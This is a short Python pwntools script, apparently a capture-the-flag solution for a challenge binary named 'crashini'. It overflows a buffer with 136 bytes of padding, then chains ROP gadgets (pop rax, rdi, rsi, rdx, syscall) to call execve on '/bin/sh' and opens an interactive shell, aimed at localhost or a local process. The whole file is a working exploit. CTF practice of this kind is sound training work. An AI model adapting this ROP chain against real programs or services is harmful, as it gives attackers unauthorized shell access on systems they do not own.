#!/usr/bin/python3
from pwn import *
import sys

HOST, PORT = "localhost", 1337
SYS_EXECVE = 0x3B

elf = ELF("../../crashini-0x0/challenge/crashini")

if len(sys.argv) > 1:
    p = remote(HOST, PORT)
else:
    p = process(elf.path)

rop = ROP(elf)
pop_rax_ret = rop.find_gadget(["pop rax", "ret"]).address
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"]).address
syscall_ret = rop.find_gadget(["syscall"]).address
str_bin_sh = next(elf.search(b"/bin/sh"))

payload = flat(
    b"A" * (128 + 8),
    p64(pop_rax_ret),
    p64(SYS_EXECVE),
    p64(pop_rdi_ret),
    p64(str_bin_sh),
    p64(pop_rsi_ret),
    p64(0),
    p64(pop_rdx_ret),
    p64(0),
    p64(syscall_ret),
)

p.sendlineafter("plzz: ", payload)
p.interactive()
